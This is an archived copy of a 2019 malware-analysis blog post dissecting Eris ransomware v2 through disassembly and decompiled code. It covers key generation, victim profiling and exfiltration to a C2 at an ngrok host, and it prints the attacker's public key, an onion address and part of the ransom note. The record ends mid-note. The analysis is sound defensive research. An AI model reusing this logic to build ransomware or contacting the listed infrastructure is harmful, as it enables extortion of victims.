{
    "id": "960caec1-b8e2-4cb2-be1f-afc2c98f8200",
    "created_at": "2023-01-12T15:07:19.419587Z",
    "updated_at": "2025-03-27T02:05:54.244774Z",
    "deleted_at": null,
    "sha1_hash": "d5822cc7b5f576693f82633c15472faa569a8ecc",
    "title": "2019-10-06 - Go under the hood- Eris Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T03:49:20Z",
    "file_modification_date": "2022-05-28T03:49:20Z",
    "file_size": 189042,
    "plain_text": "# Go Under the Hood: Eris Ransomware\n\n**lekstu.ga/posts/go-under-the-hood-eris/**\n\nOctober 6, 2019\n\n#### Eris ransomware was first discovered in May 2019. In July it was reported by Bleeping Computer that the malware was being distributed by the RIG exploit kit.\n\n Here is a set of analysis notes for version two of the family. The sample used for the analysis has the hash of\n\n```\n99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692\n\n```\n\n## Malware overview\n\n#### Version two of the Eris ransomware are made up of six packages.\n\n Sync package used to collect victim information and send it to the operator. Main package Utils Cryptography Anti package used for wiping 3rd party backup files Walk package used to walk the file system\n\n A source code layout created by redress is shown below.\n\n\n-----\n\n```\nPackage Eris/Sync: .\nFile: . \n     init Lines: 1 to 11 (10)\n     GetOS Lines: 5 to 17 (12)\n     GetSpace Lines: 11 to 12 (1)\n     GetID Lines: 11 to 25 (14)\n     GetGeo Lines: 12 to 22 (10)\n     GetSyncInfo Lines: 17 to 85 (68)\n     machineID Lines: 25 to 27 (2)\n     GetSyns Lines: 85 to 451 (366) \nPackage main: .\nFile: . \n     init Lines: 1 to 1 (0) \n     Init Lines: 30 to 46 (16)\n     main Lines: 46 to 236 (190)\n     mainfunc1 Lines: 165 to 166 (1) \n     ReadFileA Lines: 236 to 246 (10)\n     LineCountA Lines: 246 to 250 (4)\nPackage Eris/Utils: .\nFile: . \n     init Lines: 1 to 1 (0) \n     RandStringBytes Lines: 18 to 35 (17)\n     Kill Lines: 35 to 64 (29)\n     initializers Lines: 43 to 44 (1)\n     Execute Lines: 64 to 83 (19)\n     (*WindowsProcess)Pid Lines: 78 to 82 (4)\n     (*WindowsProcess)PPid Lines: 82 to 86 (4)\n     GetDrive Lines: 83 to 107 (24) \n     (*WindowsProcess)Executable Lines: 86 to 90 (4) \n     newWindowsProcess Lines: 90 to 122 (32) \n     Contains Lines: 107 to 119 (12) \n     Exists Lines: 119 to 130 (11)\n     processes Lines: 122 to 127 (5) \n     Wrap Lines: 130 to 139 (9)\nPackage Eris/Cryptography: .\nFile: . \n     init Lines: 1 to 1 (0) \n     RC4Encrypt Lines: 5 to 15 (10) \n     RSAGenerateKey Lines: 15 to 43 (28)\n     Lock Lines: 23 to 57 (34)\n     RSAEncrypt Lines: 43 to 46 (3) \nPackage Eris/Anti: .\nFile: . \n     init Lines: 1 to 10 (9) \n     WipeBackup Lines: 11 to 15 (4) \nPackage Eris/Walk: .\nFile: . \n     init Lines: 1 to 116 (115)\n     Check Lines: 10 to 18 (8)\n     WalkDirectores Lines: 18 to 130 (112)\n     WalkComputer Lines: 130 to 133 (3)\n     WalkComputerfunc1 Lines: 133 to 142 (9) \n     WalkComputerfunc2 Lines: 142 to 143 (1) \n\n```\n\n-----\n\n## Technical breakdown\n\n### Loading import functions\n\n#### The malware loads some additional imports in its init function. These imports are later used to list all the running processes.\n\n\n-----\n\n```\n(fcn) sym.Eris_Utils_init.ializers\n0x0053df90 mov ecx, dword fs:[0x14]\n0x0053df97 mov ecx, dword [ecx]\n0x0053df9d cmp esp, dword [ecx + 8]\n0x0053dfa0 jbe 0x53e101\n0x0053dfa6 sub esp, 0x10\n0x0053dfa9 lea eax, str_kernel32.dll ; \"kernel32.dll\"\n0x0053dfaf mov dword [esp], eax\n0x0053dfb2 mov dword [var_4h], 0xc\n0x0053dfba call sym.syscall.NewLazyDLL\n0x0053dfbf mov eax, dword [0x88be50]\n0x0053dfc5 mov ecx, dword [var_8h]\n0x0053dfc9 test eax, eax\n0x0053dfcb jne 0x53e0ef\n0x0053dfd1 mov dword [sym.hKernel32.dll], ecx\n0x0053dfd7 mov dword [esp], ecx\n0x0053dfda lea eax, [0x675b84] ; \"CloseHandle\"\n0x0053dfe0 mov dword [var_4h], eax\n0x0053dfe4 mov dword [var_8h], 0xb\n0x0053dfec call sym.syscall___LazyDLL_.NewProc\n0x0053dff1 mov eax, dword [0x88be50]\n0x0053dff7 mov ecx, dword [var_ch]\n0x0053dffb test eax, eax\n0x0053dffd jne 0x53e0dd\n0x0053e003 mov dword [sym.pCloseHandle], ecx\n0x0053e009 mov eax, dword [sym.hKernel32.dll]\n0x0053e00f mov dword [esp], eax\n0x0053e012 lea eax, [0x67ae16] ; \"CreateToolhelp32Snapshot\"\n0x0053e018 mov dword [var_4h], eax\n0x0053e01c mov dword [var_8h], 0x18\n0x0053e024 call sym.syscall___LazyDLL_.NewProc\n0x0053e029 mov eax, dword [0x88be50]\n0x0053e02f mov ecx, dword [var_ch]\n0x0053e033 test eax, eax\n0x0053e035 jne 0x53e0cb\n0x0053e03b mov dword [sym.pCreateToolhelp32Snapshot], ecx\n0x0053e041 mov eax, dword [sym.hKernel32.dll]\n0x0053e047 mov dword [esp], eax\n0x0053e04a lea eax, [0x6772a1] ; \"Process32FirstW\"\n0x0053e050 mov dword [var_4h], eax\n0x0053e054 mov dword [var_8h], 0xf\n0x0053e05c call sym.syscall___LazyDLL_.NewProc\n0x0053e061 mov eax, dword [0x88be50]\n0x0053e067 mov ecx, dword [var_ch]\n0x0053e06b test eax, eax\n0x0053e06d jne 0x53e0bc\n0x0053e06f mov dword [sym.pProcess32FirstW], ecx\n0x0053e075 mov eax, dword [sym.hKernel32.dll]\n0x0053e07b mov dword [esp], eax\n0x0053e07e lea eax, [0x676d3a] ; \"Process32NextW\"\n0x0053e084 mov dword [var_4h], eax\n0x0053e088 mov dword [var_8h], 0xe\n0x0053e090 call sym.syscall___LazyDLL_.NewProc\n0x0053e095 mov eax, dword [0x88be50]\n0x0053e09b mov ecx, dword [var_ch]\n\n```\n\n-----\n\n```\n0x0053e09f test eax, eax\n0x0053e0a1 jne 0x53e0ad\n0x0053e0a3 mov dword [sym.pProcess32NextW], ecx\n0x0053e0a9 add esp, 0x10\n0x0053e0ac ret\n\n### Encryption key generation\n\n#### The malware uses the following struct to store the keys generated for the victim.\ntype main.Session struct {\n  Extension string\n  PUBLIC_KEY []uint8\n  E_PRIVATE_KEY []uint8\n}\n\n It is also stored encrypted on the disk. The following snippet shows the generation of file path to the files.\n0x005fe3ff lea eax, [0x6770d0] ; \"ALLUSERSPROFILE\"\n0x005fe405 mov dword [esp], eax\n0x005fe408 mov dword [var_4h], 0xf\n0x005fe410 call fcn.os.Getenv\n0x005fe415 mov eax, dword [var_ch]\n0x005fe419 mov ecx, dword [var_8h]\n0x005fe41d mov dword [esp], ecx\n0x005fe420 mov dword [var_4h], eax\n0x005fe424 call fcn.runtime.convTstring\n0x005fe429 mov eax, dword [var_8h]\n0x005fe42d mov dword [var_198h], 0\n0x005fe438 mov dword [var_19ch], 0\n0x005fe443 mov dword [var_1a0h], 0\n0x005fe44e mov dword [var_1a4h], 0\n0x005fe459 lea ecx, sym.type.string\n0x005fe45f mov dword [var_198h], ecx\n0x005fe466 mov dword [var_19ch], eax\n0x005fe46d mov dword [var_1a0h], ecx\n0x005fe474 lea eax, [0x6cec98] ; \"00000000.pky\"\n0x005fe47a mov dword [var_1a4h], eax\n0x005fe481 lea eax, [0x6745d6] ; \"%s\\%s\"\n0x005fe487 mov dword [esp], eax\n0x005fe48a mov dword [var_4h], 5\n0x005fe492 lea edx, [var_198h]\n0x005fe499 mov dword [var_8h], edx\n0x005fe49d mov dword [var_ch], 2\n0x005fe4a5 mov dword [var_10h], 2\n0x005fe4ad call fcn.fmt.Sprintf\n\n The data is stored in these three files:\n\n```\n```\n%ALLUSERSPROFILE%\\00000000.ext\n\n```\n\n-----\n\n#### If files already exists, they are used instead of generating a new key.\n```\n0x005fe65a mov edx, dword [pky_path_str]\n0x005fe661 mov dword [esp], edx\n0x005fe664 mov ebx, dword [pky_path_str_len]\n0x005fe66b mov dword [var_4h], ebx\n0x005fe66f call fcn.Eris_Utils.Exists\n0x005fe674 movzx eax, byte [var_8h]\n0x005fe679 test al, al\n0x005fe67b je 0x5ff0c4\n0x005fe681 mov eax, dword [pky_path_str]\n0x005fe688 mov dword [esp], eax\n0x005fe68b mov eax, dword [pky_path_str_len]\n0x005fe692 mov dword [var_4h], eax\n0x005fe696 call fcn.main.ReadFileA\n0x005fe69b mov eax, dword [var_14h]\n0x005fe69f mov ecx, dword [var_10h]\n0x005fe6a3 mov edx, dword [var_8h]\n0x005fe6a7 mov ebx, dword [var_ch]\n0x005fe6ab test eax, eax\n\n The victim’s private key is encrypted with the threat actor’s public key. The encrypted blob is further encrypted RC4.\n\n```\n\n-----\n\n```\n0x005ff212 lea esi, [0x68736a] ; Public key\n0x005ff218 call fcn.0044d9f0\n0x005ff21d mov ecx, dword [var_174h]\n0x005ff224 mov dword [esp], ecx\n0x005ff227 mov dword [var_4h], 0x80\n0x005ff22f mov dword [var_8h], 0x80\n0x005ff237 mov dword [var_ch], eax\n0x005ff23b mov dword [var_10h], 0x1c3\n0x005ff243 mov dword [var_14h], 0x1c3\n0x005ff24b call fcn.Eris_Cryptography.RSAEncrypt\n0x005ff250 mov eax, dword [var_20h]\n0x005ff254 mov dword [var_8ch], eax\n0x005ff25b mov ecx, dword [var_1ch]\n0x005ff25f mov dword [var_84h], ecx\n0x005ff266 mov edx, dword [var_18h]\n0x005ff26a mov dword [var_140h], edx\n0x005ff271 mov ebx, dword [var_148h]\n0x005ff278 mov dword [esp], ebx\n0x005ff27b mov ebx, dword [var_98h]\n0x005ff282 mov dword [var_4h], ebx\n0x005ff286 mov ebx, dword [var_9ch]\n0x005ff28d mov dword [var_8h], ebx\n0x005ff291 mov ebx, dword [var_174h]\n0x005ff298 mov dword [var_ch], ebx\n0x005ff29c mov dword [var_10h], 0x80\n0x005ff2a4 mov dword [var_14h], 0x80\n0x005ff2ac call fcn.Eris_Cryptography.RC4Encrypt\n0x005ff2b1 mov eax, dword [var_1ch]\n0x005ff2b5 mov dword [var_88h], eax\n0x005ff2bc mov ecx, dword [var_18h]\n0x005ff2c0 mov dword [var_13ch], ecx\n0x005ff2c7 mov edx, dword [var_20h]\n0x005ff2cb mov dword [var_90h], edx\n\n#### Threat actor’s key:\n--BEGIN PUBLIC KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiVFawLHK0Gld4XUYi7Wq\n1ura1N78VvOuW4kvH/yDYOajqRx7nqFB2mokTDqHa5phT48FtLMbuFc+j39YnZBa\njjSN2zDaC13vDRNXfiW41yJAtMAJXh17cE/lAdAgEUQdYwJPVHfDuCPGGO5Dn+hg\nxehdJvIiNFbKCCFP7EojDH0kK1h9p8TngwqHySBNLUADKeONKPk171oe+5isEnbF\nVjBcinGF13V/CRBKXsrH2z7BCWtyZTG+MWXRqUOn2mYOFgt4ZNOe4U0nz6/A1YmJ\nV8NybH2vHp4Bs/ov7RcnQUvW0BwG0/xp6YDSaOt59A0rEbJE0+J3NTlEVPesehOr\nxwIDAQAB\n-----END PUBLIC KEY----\n The malware also looks for the existence of the file: C:\\eris.was\n\n```\n\n-----\n\n```\n0x005fe7f2 lea eax, [0x675b79] ; C:\\eris.was \n0x005fe7f8 mov dword [esp], eax\n0x005fe7fb mov dword [var_4h], 0xb\n0x005fe803 call fcn.Eris_Utils.Exists\n0x005fe808 movzx eax, byte [var_8h]\n0x005fe80d test al, al\n0x005fe80f jne 0x5ff05d\n0x005fe815 xor eax, eax\n0x005fe817 mov dword [var_94h], eax\n0x005fe81e mov ecx, dword [session]\n0x005fe825 mov edx, dword [ecx + 0x14]\n0x005fe828 mov ebx, dword [ecx + 0x18]\n0x005fe82b mov ebp, dword [ecx + 0x1c]\n0x005fe82e mov dword [esp], edx\n0x005fe831 mov dword [var_4h], ebx\n0x005fe835 mov dword [var_8h], ebp\n0x005fe839 call fcn.Eris_Sync.GetSyns\n\n### Victim information\n\n#### The Eris malware collects information about the infected system. The data is populated into the structure shown below.\ntype Struct.BotJson struct{\n  UID string\n  SID string\n  Kind int\n  Storage []struct {\n    Alphabet string `json:\"alphabet\"`\n    Label string `json:\"label\"`\n    Type int `json:\"type\"`\n    Free int64 `json:\"free\"`\n    Full int64 `json:\"full\"`\n  }\n  Extension string\n  OS string\n  UserName string\n  PCName string\n  Country string\n  City string\n  IP string\n  Org string\n  Stage1 string\n  Stage2 string\n  Date int64\n}\n\n Username is collected from the environment variable and the host name is retrieved via the standard library function:\n\n```\n\n-----\n\n```\n0x005f8d21 lea ecx, [0x67505a] ; USERNAME \n0x005f8d27 mov dword [esp], ecx\n0x005f8d2a mov dword [var_4h], 8\n0x005f8d32 call fcn.os.Getenv\n0x005f8d37 mov ecx, dword [var_8h]\n0x005f8d3b mov edx, dword [var_ch]\n0x005f8d3f mov dword [username_str], ecx\n0x005f8d46 mov dword [username_str_len], edx\n0x005f8d4d nop\n0x005f8d4e call fcn.os.hostname\n0x005f8d53 mov ecx, dword [esp]\n0x005f8d56 mov edx, dword [var_4h]\n0x005f8d5a mov ebx, dword [var_8h]\n0x005f8d5e test ebx, ebx\n0x005f8d60 je 0x5f8f7e\n0x005f8d66 lea eax, [0x674dca] ; \"unknown\"\n0x005f8d6c mov dword [hostname_str], eax\n0x005f8d73 mov dword [hostname_str_len], 7\n...\n0x005f8f7e mov dword [hostname_str], ecx\n0x005f8f85 mov dword [hostname_str_len], edx\n0x005f8f8c jmp 0x5f8d7e\n\n#### The ID of the machine is generated from the machine ID. First the GUID is fetched from the registry. A summary of the Eris_Sync.machineID function is shown below.\n0x005f8a10 \"SOFTWARE\\Microsoft\\Cryptography\"\n0x005f8a2a call sym.golang.org_x_sys_windows_registry.OpenKey\n0x005f8a5c call sym.runtime.deferproc\n0x005f8a63 cjmp 0x005f8b0d\n0x005f8a6f cjmp 0x005f8ae7\n0x005f8a78 \"MachineGuid\"\n0x005f8a8a call sym.golang.org_x_sys_windows_registry_Key.GetStringValue\n0x005f8aa1 cjmp 0x005f8ac5\n0x005f8abc call sym.runtime.deferreturn\n0x005f8ac5:\n0x005f8ade call sym.runtime.deferreturn\n0x005f8ae7:\n0x005f8b04 call sym.runtime.deferreturn\n0x005f8b0d:\n0x005f8b0e call sym.runtime.deferreturn\n0x005f8b17:\n0x005f8b17 call sym.runtime.morestack_noctxt\n0x005f8b1c jmp 0x005f89d0\n0x005f8b1c sym.Eris_Sync.machineID\n\n The GUID is hashed with SHA1 and the hex-encoded string is used as the ID. If no GUID is found, the ID is generated from a set of random bytes. Below is a Ghidra decompiled representation of the function.\n\n```\n\n-----\n\n```\nvoid sym.Eris_Sync.GetID(undefined4 uParm1, undefined4 uParm2)\n{\n  uint32_t *puVar1;\n  int32_t iVar2;\n  int32_t iVar3;\n  int32_t in_FS_OFFSET;\n  undefined4 *in_stack_ffffffa4;\n  undefined4 *in_stack_ffffffa8;\n  undefined4 *puVar4;\n  undefined4 *in_stack_ffffffac;\n  undefined4 *in_stack_ffffffb0;\n  int32_t in_stack_ffffffb4;\n  uint32_t in_stack_ffffffb8;\n  uint32_t uVar5;\n  int32_t in_stack_ffffffbc;\n  undefined4 uStack56;\n  int32_t iStack52;\n  undefined4 uStack48;\n  sym.Eris_Sync.machineID();\n  puVar4 = in_stack_ffffffa8;\n  if ((in_stack_ffffffac != (undefined4 *)0x0) && (in_stack_ffffffa8 == (undefined4\n*)0x0)) {\n  // If no GUID, generate random string.\n    in_stack_ffffffa4 = in_stack_ffffffa8;\n    in_stack_ffffffa8 = in_stack_ffffffac;\n    sym.Eris_Utils.RandStringBytes(0x20);\n    puVar4 = in_stack_ffffffa4;\n  }\n  sym.runtime.newobject(sym.type.sha1.digest);\n  *puVar4 = 0x67452301;\n  puVar4[1] = 0xefcdab89;\n  puVar4[2] = 0x98badcfe;\n  puVar4[3] = 0x10325476;\n  puVar4[4] = 0xc3d2e1f0;\n  puVar4[0x15] = 0;\n  puVar4[0x16] = 0;\n  puVar4[0x17] = 0;\n  sym.runtime.stringtoslicebyte(0, in_stack_ffffffa4, in_stack_ffffffa8);\n  sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, in_stack_ffffffb4,\nin_stack_ffffffb8);\n  sym.runtime.newobject(sym.type._9_uint8);\n  *in_stack_ffffffb0 = 0x6e617247;\n  *(undefined4 *)((int32_t)in_stack_ffffffb0 + 1) = 0x646e6172;\n  *(undefined4 *)((int32_t)in_stack_ffffffb0 + 5) = 0x73697245;\n  sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, 9, 9);\n  sym.crypto_sha1___digest_.Sum(puVar4, 0, 0, 0);\n  iVar2 = in_stack_ffffffb4;\n  uVar5 = in_stack_ffffffb8;\n  iVar3 = in_stack_ffffffbc;\n  sym.crypto_sha1___digest_.Sum(puVar4, 0, 0, 0);\n  if (7 < uVar5) {\n    iVar2 = iVar2 + (-(iVar3 + -8) >> 0x1f & 8U);\n    sym.golang.org_x_crypto_pbkdf2.Key(in_stack_ffffffb4, in_stack_ffffffb8,\n            in_stack_ffffffbc, iVar2, uVar5 - 8,\n\n```\n\n-----\n\n```\n            iVar3 + 8, 0x7e4, 8, 0x68ae74);\n    iVar3 = iStack52 << 1;\n    sym.runtime.makeslice(sym.type.uint8, iVar3, iVar3);\n    sym.encoding_hex.Encode(iVar2, iVar3, iVar3, uStack56,\n                iStack52, uStack48);\n    sym.runtime.slicebytetostring(0, iVar2, iVar3, iVar3);\n    return;\n  }\n  sym.runtime.panicslice();\n  do {\n    invalidInstructionException();\n  } while( true );\n}\n\n#### Disk space is gathered from all disks attached. First the malware checks which drive letters exist.\n0x005f7f92 cmp ecx, 0x1a ; 26\n0x005f7f95 jge 0x5f80c7\n0x005f7f9b mov dword [var_3ch], ecx\n0x005f7f9f mov dword [var_4ch], ebx\n0x005f7fa3 lea eax, [var_64h]\n0x005f7fa7 mov dword [esp], eax\n0x005f7faa lea eax, [ecx + 0x41]\n0x005f7fad mov dword [var_4h], eax\n0x005f7fb1 sar eax, 0x1f\n0x005f7fb4 mov dword [var_8h], eax\n0x005f7fb8 call fcn.runtime.intstring\n0x005f7fbd mov eax, dword [var_10h]\n0x005f7fc1 mov ecx, dword [var_ch]\n0x005f7fc5 mov dword [esp], 0\n0x005f7fcc mov dword [var_4h], ecx\n0x005f7fd0 mov dword [var_8h], eax\n0x005f7fd4 lea eax, [0x673e20] ; \":\\\"\n0x005f7fda mov dword [var_ch], eax\n0x005f7fde mov dword [var_10h], 2\n0x005f7fe6 call fcn.runtime.concatstring2\n0x005f7feb mov eax, dword [var_18h]\n0x005f7fef mov dword [var_50h], eax\n0x005f7ff3 mov ecx, dword [var_14h]\n0x005f7ff7 mov dword [var_474h], ecx\n0x005f7ffe mov dword [esp], ecx\n0x005f8001 mov dword [var_4h], eax\n0x005f8005 call fcn.os.Stat\n0x005f800a mov eax, dword [var_10h]\n0x005f800e mov ecx, dword [var_14h]\n0x005f8012 mov dword [esp], eax\n0x005f8015 mov dword [var_4h], ecx\n0x005f8019 call fcn.os.IsNotExist\n0x005f801e movzx eax, byte [var_8h]\n0x005f8023 test al, al\n\n The disk space is gotten by calling GetVolumeInformationW .\n\n```\n\n-----\n\n```\n0x005f82e9 lea edx, [0x67983a] ; GetVolumeInformationW \n0x005f82ef mov dword [var_4h], edx\n0x005f82f3 mov dword [var_8h], 0x15\n0x005f82fb call fcn.syscall.GetProcAddress\n0x005f8300 mov edx, dword [var_ch]\n0x005f8304 mov dword [pGetVolumeInformationW], edx\n0x005f8308 mov ebx, dword [var_470h]\n0x005f830f mov dword [esp], ebx\n0x005f8312 mov ebp, dword [var_38h]\n0x005f8316 mov dword [var_4h], ebp\n0x005f831a call fcn.syscall.StringToUTF16Ptr\n0x005f831f mov edx, dword [var_8h]\n0x005f8323 mov dword [var_498h], edx\n0x005f832a lea edx, [var_266h]\n0x005f8331 mov dword [var_494h], edx\n0x005f8338 lea ebx, [var_54h]\n0x005f833c mov dword [var_490h], ebx\n0x005f8343 lea ebx, [var_58h]\n0x005f8347 mov dword [var_48ch], ebx\n0x005f834e lea ebx, [var_5ch]\n0x005f8352 mov dword [var_488h], ebx\n0x005f8359 lea ebx, [var_68h]\n0x005f835d mov dword [var_484h], ebx\n0x005f8364 mov ebx, dword [pGetVolumeInformationW]\n0x005f8368 mov dword [esp], ebx\n0x005f836b mov dword [var_4h], 8\n0x005f8373 mov ebx, dword [var_498h]\n0x005f837a mov dword [var_8h], ebx\n0x005f837e mov ebx, dword [var_494h]\n0x005f8385 mov dword [var_ch], ebx\n0x005f8389 mov dword [var_10h], 0x105\n0x005f8391 mov ebx, dword [var_490h]\n0x005f8398 mov dword [var_14h], ebx\n0x005f839c mov ebx, dword [var_48ch]\n0x005f83a3 mov dword [var_18h], ebx\n0x005f83a7 mov ebx, dword [var_488h]\n0x005f83ae mov dword [var_1ch], ebx\n0x005f83b2 mov ebx, dword [var_484h]\n0x005f83b9 mov dword [var_20h], ebx\n0x005f83bd mov dword [var_24h], 0x105\n0x005f83c5 mov dword [var_28h], 0\n0x005f83cd call fcn.syscall.Syscall9\n\n```\n\n-----\n\n```\n0x005f80fa mov eax, dword [var_470h]\n0x005f8101 mov dword [esp], eax\n0x005f8104 mov ecx, dword [var_38h]\n0x005f8108 mov dword [var_4h], ecx\n0x005f810c call fcn.syscall.StringToUTF16Ptr\n0x005f8111 mov eax, dword [var_8h]\n0x005f8115 mov dword [var_49ch], eax\n0x005f811c lea ecx, sym.type._4_uintptr\n0x005f8122 mov dword [esp], ecx\n0x005f8125 call fcn.runtime.newobject\n0x005f812a mov eax, dword [var_4h]\n0x005f812e mov ecx, dword [var_49ch]\n0x005f8135 mov dword [eax], ecx\n0x005f8137 mov ecx, dword [var_4ach]\n0x005f813e mov dword [eax + 4], ecx\n0x005f8141 mov ecx, dword [var_4a8h]\n0x005f8148 mov dword [eax + 8], ecx\n0x005f814b mov ecx, dword [var_4b0h]\n0x005f8152 mov dword [eax + 0xc], ecx\n0x005f8155 mov ecx, dword [pGetDiskFreeSpaceExW]\n0x005f815c mov dword [esp], ecx\n0x005f815f mov dword [var_4h], eax\n0x005f8163 mov dword [var_8h], 4\n0x005f816b mov dword [var_ch], 4\n0x005f8173 call fcn.syscall___Proc_.Call\n0x005f8178 mov eax, dword [var_470h]\n0x005f817f mov dword [esp], eax\n0x005f8182 mov eax, dword [var_38h]\n0x005f8186 mov dword [var_4h], eax\n0x005f818a call fcn.syscall.StringToUTF16Ptr\n0x005f818f mov eax, dword [var_8h]\n0x005f8193 mov dword [esp], eax\n0x005f8196 call fcn.golang.org_x_sys_windows.GetDriveType\n\n#### The information for each drive is stored in a slice of structs as shown below.\n\n Returns:\n  []struct {\n    Alphabet string `json:\"alphabet\"`\n    Label string `json:\"label\"`\n    Type int `json:\"type\"`\n    Free int64 `json:\"free\"`\n    Full int64 `json:\"full\"`\n  }\n\n Operating information is collected from the registry key ProductName . Below is a Ghidra decompiled representation of the function.\n\n```\n\n-----\n\n```\nvoid fcn.Eris_Sync.GetOS(undefined4 uParm1, undefined4 uParm2)\n{\n  while (puVar1 = (uint32_t *)(**(int32_t **)(in_FS_OFFSET + 0x14) + 8),\n      register0x00000010 < (undefined *)*puVar1 || (undefined\n*)register0x00000010 == (undefined *)*puVar1) {\n    fcn.runtime.morestack_noctxt();\n  }\n  uParm1 = 0;\n  uParm2 = 0;\n  uVar3 = 0xf003f;\n  key = fcn.golang.org_x_sys_windows_registry.OpenKey(0x80000002,\n\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", 0xf003f);\n  fcn.runtime.deferproc(0xc, 0x68afc4, uStack24);\n  if (key != 0) {\n    if (iStack20 == 0) {\n      prod_name = fcn.golang.org_x_sys_windows_registry_Key.GetStringValue(key,\n\"ProductName\");\n      uParm1 = uVar3;\n      if (prod_name != 0) {\n        fcn.runtime.deferreturn();\n        return prod_name;\n      }\n  }\n  fcn.runtime.deferreturn();\n  return \"unknown\";\n}\n\n#### Geo-location is gathered by performing a request to extreme-ip-lookup.com\n0x005f84c4 lea ecx, sym.type.http.Client\n0x005f84ca mov dword [esp], ecx\n0x005f84cd call fcn.runtime.newobject\n0x005f84d2 mov ecx, dword [var_4h]\n0x005f84d6 mov dword [var_34h], ecx\n0x005f84da mov dword [ecx + 0x14], 0x540be400\n0x005f84e1 mov dword [ecx + 0x18], 2\n0x005f84e8 lea edx, sym.type.Struct.Geo\n0x005f84ee mov dword [esp], edx\n0x005f84f1 call fcn.runtime.newobject\n0x005f84f6 mov ecx, dword [var_4h]\n0x005f84fa mov dword [var_44h], ecx\n0x005f84fe lea edx, [0x673fa6] ; \"GET\"\n0x005f8504 mov dword [esp], edx\n0x005f8507 mov dword [var_4h], 3\n0x005f850f lea edx, [0x67f274] ; \"http://extreme-ip-lookup.com/json/\n0x005f8515 mov dword [var_8h], edx\n0x005f8519 mov dword [var_ch], 0x22\n0x005f8521 mov dword [var_10h], 0\n0x005f8529 mov dword [var_14h], 0\n0x005f8531 call fcn.net_http.NewRequest\n0x005f8536 mov ecx, dword [var_18h]\n\n User agent used: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\n\n```\n\n-----\n\n#### Data returned from the service:\n```\ntype Struct.Geo struct {\n  BusinessName  string\n  BusinessWebsite string\n  City      string\n  Continent    string\n  Country     string\n  CountryCode   string\n  IPName     string\n  IPType     string\n  Isp       string\n  Lat       string\n  Lon       string\n  Org       string\n  Query      string\n  Region     string\n  Status     string\n}\n\n The data is sent to the C2 server located at d9d120a3.ngrok.io . The malware tries three times.\n   0x005fe815 xor eax, eax\n .-> 0x005fe817 mov dword [var_94h], eax\n :  0x005fe81e mov ecx, dword [session]\n :  0x005fe825 mov edx, dword [ecx + 0x14]\n :  0x005fe828 mov ebx, dword [ecx + 0x18]\n :  0x005fe82b mov ebp, dword [ecx + 0x1c]\n :  0x005fe82e mov dword [esp], edx\n :  0x005fe831 mov dword [var_4h], ebx\n :  0x005fe835 mov dword [var_8h], ebp\n :  0x005fe839 call fcn.Eris_Sync.GetSyns\n :  0x005fe83e mov eax, dword [var_18h]\n :  0x005fe842 test eax, eax\n,==< 0x005fe844 je 0x5fe853\n|:  0x005fe846 mov eax, dword [var_94h]\n|:  0x005fe84d inc eax\n|:  0x005fe84e cmp eax, 3\n|`=< 0x005fe851 jle 0x5fe817\n`--> 0x005fe853 mov eax, dword [session]\n\n Summary of function that sends the data:\n\n```\n\n-----\n\n```\n0x005f8fa0:\n0x005f8fb9 sym.type.http.Client\n0x005f8fc2 call fcn.runtime.newobject\n0x005f8ffd sym.type.string\n0x005f9007 \"d9d120a3.ngrok.io\"\n0x005f9015 \"redirect\"\n0x005f901f \"https://%s/%\"\n0x005f9048 call fcn.fmt.Sprintf\n0x005f905e sym.type.bytes.Buffer\n0x005f9067 call fcn.runtime.newobject\n0x005f9086 cjmp 0x005f92c5\n0x005f9092:\n0x005f9092 \"POST\"\n0x005f90c1 call fcn.net_http.NewRequest\n0x005f90d6 sym.type.Struct.Response\n0x005f90df call fcn.runtime.newobject\n0x005f90ee cjmp 0x005f9118\n0x005f90f0:\n0x005f9118:\n0x005f9129 \"User-Agent\"\n0x005f913a call fcn.net_textproto.CanonicalMIMEHeaderKey\n0x005f914f sym.type._1_string\n0x005f9158 call fcn.runtime.newobject\n0x005f9174 cjmp 0x005f92b5\n0x005f917a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/58.0.3029.110 Safari/537.36\"\n0x005f9182:\n0x005f9182 sym.type.textproto.MIMEHeader\n0x005f91a3 call fcn.runtime.mapassign_faststr\n0x005f91c2 cjmp 0x005f92a7\n0x005f91ce:\n0x005f91de call fcn.net_http___Client_.do\n0x005f91ed cjmp 0x005f91f8\n0x005f91ef:\n0x005f91f3 jmp 0x005f90f0\n0x005f91f8:\n0x005f91fe sym.type.io.Reader\n0x005f920f call fcn.runtime.convI2I\n0x005f9234 call fcn.io_ioutil.readAll\n0x005f924b cjmp 0x005f91ef\n0x005f9258 sym.type._Struct.Response\n0x005f926a call fcn.encoding_json.Unmarshal\n\n#### The server response with the following data in JSON:\ntype Struct.Response struct {\n  Response string\n  Code   int\n}\n\n### Ransomware initialization\n\n#### Before encrypting files, the malware prepares the ransom note. The note is shown below. The malware performs the following operations on the note template:\n\n```\n\n-----\n\n#### Replace {version} with 2.0.3 Replace {host} with\n```\n[[epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion]]\n\n Replace {id} with the id. Replace {identification} with base58 encoded encrypted key.\n\n```\n\n-----\n\n```\n                                 \\x0d\n*** READ THIS FILE CAREFULLY TO RECOVERY YOUR FILES ***\\x0d\n***                         ***\\x0d\n\\x0d\n\\x0d\n\\x0d\nALERT! \\x0d\nALL OF YOUR FILES HAVE BEEN ENCRYPTED BY \"ERIS RANSOMWARE\" v{version}!\\x0d\n\\x0d\nWelcome to Eris System Security Encryption Program!\\x0d\n\\x0d\nKeeping strong security for our clients in mind, we have implemented Strong\nEncryption Algorithm for securing the system.\\x0d\n\\x0d\nTo personally update regarding the available decryption software and payment methods.\nFollow the steps below to access the payment page.\\x0d\n\\x0d\n\\x0d\nFollow the steps below to access payment page.\\x0d\n\\x0d\n1. Download and install Tor browser from here:\\x0d\n  URL - https://www.torproject.org/download/\\x0d\n\\x0d\n2. Visit page below using Tor browser:\\x0d\n  URL - 